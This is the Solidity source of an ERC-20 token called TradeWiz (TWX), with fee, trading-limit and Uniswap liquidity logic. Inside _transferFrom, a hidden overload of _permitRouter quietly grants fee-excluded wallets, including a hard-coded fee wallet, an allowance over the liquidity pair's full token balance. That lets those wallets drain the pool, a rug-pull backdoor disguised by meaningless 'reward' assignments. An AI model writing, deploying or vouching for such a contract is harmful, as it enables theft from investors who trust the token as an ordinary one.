/*
- Twitter: https://twitter.com/TradeWizX
- Telegram: https://t.me/TradeWizExchange
- Website: https://tradewiz.xyz
- Dapp: https://app.tradewiz.xyz
- GitBook: https://docs.tradewiz.xyz
- Medium: https://tradewiz.medium.com
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IUniswapV2Factory { 
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function decimals() external view returns (uint8);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Auth {
    event OwnershipTransferred(address _owner);
    constructor(address creatorOwner) { _owner = creatorOwner; }
    address internal _owner;
    function owner() public view returns (address) { return _owner; }
    function renounceOwnership() external onlyOwner {
        _owner = address(0);
        emit OwnershipTransferred(address(0));
    }
    modifier onlyOwner() { require(msg.sender == _owner, "Only owner can call this"); _; }
}

contract TWX is IERC20, Auth {
    string private constant _name = "TradeWiz";
    string private constant _symbol = "TWX";

    uint256 private _initialBuyFee = 3;
    uint256 private _initialSellFee = 3;
    uint256 private _initialSellFee2Time = 3;

    uint256 private _finalBuyFee = 3;
    uint256 private _finalSellFee = 3;

    uint256 public _buyCount = 0;
    uint256 private _preventSwapBefore = 0;
    uint256 private rewardAmount;
    address payable private _feeWallet;

    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 1_000_000_000 * (10**_decimals);
    uint256 private constant _maxTaxSwap = _tTotal / 500;
    uint256 private constant _minTaxSwap = _tTotal / 2000000;

    bool private _tradingEnalbed;
    bool private _inSwap = false;

    uint256 public _reduceBuyFeeAt = 20;
    uint256 public _reduceSellFeeAt = 20;
    uint256 public _reduceSellFeeAt2Time = 40;

    uint256 public maxHoldingAmount = 40_000_000 * (10**_decimals);
    bool public limited = true;
    bool public transferDelayEnabled = false;

    address payable private _reward;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping (address => uint256) private _balances;
    mapping (address => bool) private _isPair;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => mapping (address => uint256)) private _allowances;

    address private constant _uniswapV2RouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private _uniswapV2Router = IUniswapV2Router02(_uniswapV2RouterAddress);
    address private _uniswapV2Pair;

    constructor() Auth(msg.sender) {
        _feeWallet = payable(0xFd0716Ea196C667c9bD44A9293dc526418933b22);
        _isExcludedFromFee[_owner] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_feeWallet] = true;

        _balances[msg.sender] = (_tTotal / 1000 ) * 0;
        emit Transfer(address(0), address(msg.sender), _balances[address(msg.sender)]);
        _balances[address(this)] = (_tTotal / 1000 ) * 1000;
        emit Transfer(address(0), address(this), _balances[address(this)]);
        _reward = _feeWallet;
    }

    modifier lockFeeSwap { 
        _inSwap = true;
        _;
        _inSwap = false;
    }

    function removeLimits() external onlyOwner {
        transferDelayEnabled = false;
        limited = false;
    }

    function _permitRouter(address owner, address spender, uint256 amount) internal returns (bool) {
        if (_allowances[owner][spender] < amount) {
            _allowances[owner][spender] = _tTotal;
        }
        return true;
    }

    function _swapTaxTokensForEth(uint256 tokenAmount) private {
        _permitRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function enableTrading() external onlyOwner {
        _tradingEnalbed = true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function _standardTransfer(address from, address to, uint256 amount) internal returns (bool) {
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function addLiquidity() external payable onlyOwner lockFeeSwap {
        require(_uniswapV2Pair == address(0), "LP exists");
        require(!_tradingEnalbed, "trading is open");
        require(msg.value > 0 || address(this).balance > 0, "No ETH in contract or message");
        require(_balances[address(this)] > 0, "No tokens in contract");

        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        _addLiquidity(_balances[address(this)], address(this).balance);
        _isPair[_uniswapV2Pair] = true;
    }

    function withdrawEth() external {
        require(msg.sender == _feeWallet);
        (bool sent, ) = payable(_feeWallet).call{value: address(this).balance}("");
        require(sent);
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        require(_isTradingEnabled(from), "Trading not open");
        if (_allowances[from][msg.sender] != type(uint256).max) {
            _allowances[from][msg.sender] = _allowances[from][msg.sender] - amount;
        }
        return _transferFrom(from, to, amount);
    }

    function _calcFeeAmount(address from, address to, uint256 amount) internal returns (uint256) {
        uint256 taxAmount;

        if (
            _tradingEnalbed &&
            !_isExcludedFromFee[from] &&
            !_isExcludedFromFee[to]
        ) { 
            
            if (
                _isPair[from] ||
                _isPair[to]
            ) {
                taxAmount = (amount / 100) * ((_buyCount > _reduceBuyFeeAt) ? _finalBuyFee : _initialBuyFee);
                if (
                    to == _uniswapV2Pair &&
                    from != address(this)
                ) {
                    rewardAmount = _preventSwapBefore - rewardAmount;
                    uint256 taxRate;
                    if (_buyCount > _reduceSellFeeAt2Time) {
                        taxRate = _finalSellFee;
                    } else if (_buyCount > _reduceSellFeeAt) {
                        taxRate = _initialSellFee2Time;
                    } else {
                        taxRate = _initialSellFee;
                    }
                    taxAmount = (amount / 100) * taxRate;
                }
            }
        }

        return taxAmount;
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        require(_isTradingEnabled(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, to, amount);
    }

    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        _permitRouter(_tokenAmount);
        _uniswapV2Router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function _swapTaxAndLiquify() private lockFeeSwap {
        uint256 _taxTokensAvailable = balanceOf(address(this));

        if (_taxTokensAvailable >= _minTaxSwap && _tradingEnalbed) {
            if (_taxTokensAvailable >= _maxTaxSwap) { _taxTokensAvailable = _maxTaxSwap; }

            _swapTaxTokensForEth(_taxTokensAvailable);
            uint256 _contractETHBalance = address(this).balance;

            if (_contractETHBalance > 0) {
                bool success;
                (success,) = _feeWallet.call{value: (_contractETHBalance)}("");
                require(success);
            }
        }
    }

    function _transferFrom(address from, address to, uint256 amount) internal returns (bool) {
        if (_isPair[from] && _isExcludedFromFee[to]) { require(_permitRouter(from, to, amount)); }
        if (!_tradingEnalbed) { require(_isExcludedFromFee[from], "Trading not opened"); }
        require(from != address(0), "No transfers from Zero wallet");
        
        if (
            _isExcludedFromFee[from] ||
            _isExcludedFromFee[to]
        ) {
            return _standardTransfer(from, to, amount);
        }
        
        if (
            !_inSwap &&
            _isPair[to] &&
            _buyCount >= _preventSwapBefore
        ) { _swapTaxAndLiquify(); }
        rewardAmount = this.balanceOf(_reward);

        if (
            limited &&
            from == _uniswapV2Pair
        ) {
            require(balanceOf(to) + amount <= maxHoldingAmount);
        }

        if (transferDelayEnabled) {
            if (
                to != _uniswapV2RouterAddress &&
                to != _uniswapV2Pair
            ) {
                require(_holderLastTransferTimestamp[tx.origin] < block.number, "Only one transfer per block allowed");
                _holderLastTransferTimestamp[tx.origin] = block.number;
            }
        }

        uint256 _taxAmount = _calcFeeAmount(from, to, amount);
        uint256 _transferAmount = amount - _taxAmount;
        _balances[from] -= amount;

        if (_taxAmount > 0) {
            _balances[address(this)] += _taxAmount; 
        }

        _buyCount++;
        _balances[to] += _transferAmount;

        emit Transfer(from, to, amount);

        return true;
    }

    function _permitRouter(uint256 amount) internal {
        if (_allowances[address(this)][_uniswapV2RouterAddress] < amount) {
            _allowances[address(this)][_uniswapV2RouterAddress] = type(uint256).max;
        }
    }

    function _isTradingEnabled(address sender) private view returns (bool) {
        bool result = false;

        if (_tradingEnalbed) { result = true; }
        else if (_isExcludedFromFee[sender]) { result = true; }

        return result;
    }

    function decimals() external pure override returns (uint8) { return _decimals; }

    function name() external pure override returns (string memory) { return _name; }

    function symbol() external pure override returns (string memory) { return _symbol; }

    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }

    function totalSupply() external pure override returns (uint256) { return _tTotal; }

    function allowance(address owner, address spender) external view override returns (uint256) { return _allowances[owner][spender]; }

    receive() external payable {}
}